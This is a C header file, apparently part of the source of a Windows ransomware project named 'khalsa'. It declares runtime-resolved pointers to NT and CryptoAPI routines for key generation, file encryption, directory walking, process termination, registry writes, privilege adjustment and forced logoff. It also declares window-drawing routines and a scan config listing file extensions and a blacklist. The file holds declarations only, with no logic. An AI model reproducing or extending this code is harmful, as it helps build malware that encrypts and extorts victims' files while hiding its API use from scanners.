#pragma once

#include "khalsa_structs.h"
#include "khalsa_defs.h"
#include <stdio.h>

__LdrUnloadDll _LdrUnloadDll;
__LdrLoadDll _LdrLoadDll;
__RtlInitAnsiString _RtlInitAnsiString;
__RtlInitUnicodeString _RtlInitUnicodeString;
__LdrGetProcedureAddress _LdrGetProcedureAddress;
__LdrGetDllHandle _LdrGetDllHandle;
__CryptAcquireContextW _CryptAcquireContextW;
__CryptReleaseContext _CryptReleaseContext;
__NtCreateMutant _NtCreateMutant;
__CryptEncrypt _CryptEncrypt;
__RtlDosPathNameToNtPathName_U _RtlDosPathNameToNtPathName_U;
__NtCreateFile _NtCreateFile;
__HeapFree _HeapFree;
__HeapAlloc _HeapAlloc;
__GetProcessHeap _GetProcessHeap;
__NtClose _NtClose;
__NtQuerySystemInformation _NtQuerySystemInformation;
__NtOpenProcess _NtOpenProcess;
__NtTerminateProcess _NtTerminateProcess;
__CryptStringToBinaryW _CryptStringToBinaryW;
__CryptDecodeObjectEx _CryptDecodeObjectEx;
__CryptImportPublicKeyInfo _CryptImportPublicKeyInfo;
__LocalFree _LocalFree;
__CryptEncrypt _CryptEncrypt;
__CryptExportKey _CryptExportKey;
__CryptGenKey _CryptGenKey;
__CryptDestroyKey _CryptDestroyKey;
__NtQueryInformationFile _NtQueryInformationFile;
__NtSetInformationFile _NtSetInformationFile;
__RtlExpandEnvironmentStrings_U _RtlExpandEnvironmentStrings_U;
__RtlGetCurrentDirectory_U _RtlGetCurrentDirectory_U;
__NtOpenFile _NtOpenFile;
__NtQueryDirectoryFile _NtQueryDirectoryFile;
__NtQueryInformationProcess _NtQueryInformationProcess;
__NtCreateKey _NtCreateKey;
__NtSetValueKey _NtSetValueKey;
__NtWaitForSingleObject _NtWaitForSingleObject;
__NtReadFile _NtReadFile;
__NtFlushBuffersFile _NtFlushBuffersFile;
__RtlGenRandom _RtlGenRandom;
__NtWriteFile _NtWriteFile;
__RtlDosPathNameToRelativeNtPathName_U _RtlDosPathNameToRelativeNtPathName_U;
__RtlOpenCurrentUser _RtlOpenCurrentUser;
__RtlCreateUnicodeString _RtlCreateUnicodeString;
__RtlFreeUnicodeString _RtlFreeUnicodeString;

__RtlCreateUserThread _RtlCreateUserThread;
__NtWaitForMultipleObjects _NtWaitForMultipleObjects;
__NtDelayExecution _NtDelayExecution;
__NtOpenProcessToken _NtOpenProcessToken;
__NtAdjustPrivilegesToken _NtAdjustPrivilegesToken;


__GetLastError _GetLastError;
__wsprintfW _wsprintfW;
__CreateFontW _CreateFontW;
__GetDC _GetDC;
__GetTextExtentPoint32W _GetTextExtentPoint32W;
__MoveWindow _MoveWindow;
__SendMessageW _SendMessageW;
__SetBkColor _SetBkColor;
__SetTextColor _SetTextColor;
__DefWindowProcW _DefWindowProcW;
__PostQuitMessage _PostQuitMessage;
__DeleteObject _DeleteObject;
__DispatchMessageW _DispatchMessageW;
__TranslateMessage _TranslateMessage;
__GetMessageW _GetMessageW;
__ShowWindow _ShowWindow;
__CreateWindowExW _CreateWindowExW;
__GetDesktopWindow _GetDesktopWindow;
__GetWindowRect _GetWindowRect;
__RegisterClassExW _RegisterClassExW;
__CreateSolidBrush _CreateSolidBrush;
__LookupPrivilegeValueW _LookupPrivilegeValueW;
__ExitWindowsEx _ExitWindowsEx;
typedef int (WINAPI* __MessageBoxW)(
	HWND    hWnd,
	LPCWSTR lpText,
	LPCWSTR lpCaption,
	UINT    uType
	);
__MessageBoxW _MessageBoxW;

typedef struct _KHALSA_SCAN_CONFIG {
    LPWSTR* lpszExts;
    LPWSTR* lpszBlacklist;
} KHALSA_SCAN_CONFIG, * PKHALSA_SCAN_CONFIG;